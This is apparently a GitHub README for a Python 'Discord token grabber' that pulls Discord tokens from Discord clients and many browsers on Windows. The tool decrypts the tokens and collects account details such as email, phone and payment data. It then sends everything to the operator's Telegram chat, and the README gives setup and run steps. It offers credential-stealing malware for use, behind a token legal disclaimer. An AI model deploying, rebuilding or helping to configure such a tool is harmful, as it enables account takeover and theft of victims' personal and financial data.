# Discord Token Grabber with Telegram Integration

This Python script extracts Discord tokens from various applications on a Windows machine, retrieves user information (e.g., Nitro status, friends, guilds), and sends the data to a Telegram chat via the Telegram API.

**Warning**: This script accesses sensitive user data (e.g., Discord tokens, payment methods). Use it responsibly and legally. Sharing or using this script to harm others may violate Discord's Terms of Service and local laws.

## Features

- Extracts Discord tokens from multiple platforms (e.g., Discord, Chrome, Brave).
- Decrypts tokens using Windows CryptUnprotectData and AES-GCM.
- Fetches user details from Discord API (e.g., email, phone, Nitro, guilds).
- Sends data to a Telegram chat with a user avatar photo.

## Supported Platforms

- Discord, Discord Canary, Discord PTB, Lightcord
- Chrome, Chrome SxS, Microsoft Edge, Brave, Yandex, Vivaldi, etc.
- Opera, Opera GX, Amigo, Torch, Kometa, Orbitum, etc.

## Prerequisites

- **Operating System**: Windows only (script checks for `os.name == "nt"`).
- **Python**: Version 3.x installed.
- **Telegram Bot**: A Telegram bot token and chat ID to receive data.

## Installation

1. **Clone the Repository**:
   git clone https://github.com/yourusername/discord-token-grabber.git
   cd discord-token-grabber

2. **Install Dependencies**:
   The script automatically installs missing modules (`pypiwin32`, `pycryptodome`) on first run. Alternatively, install them manually:
   pip install pypiwin32 pycryptodome requests bcrypt
3. **Set Up Telegram Bot**:

- Create a Telegram bot via [BotFather](https://t.me/BotFather) and get your bot token (e.g., `12345:ABCDEF...`).
- Get your chat ID (e.g., `-ๅ23456789`) by messaging your bot and using a service like `@GetIDsBot`.

## Usage

1. **Edit the Script**:

- Open `main.py`.
- Replace `"Enter your telegram bot token here..."` in the `main()` call at the bottom with your Telegram bot token:
  ```python
  if __name__ == "__main__":
      main("12345:ABCDEF...")
  ```
- Replace the chat_id in the data dictionary with your Telegram chat ID:
  ```python
  "chat_id": "-ๅ23456789",  # Change to your chat ID
  ```

2. **Run the Script:**

- python main.py
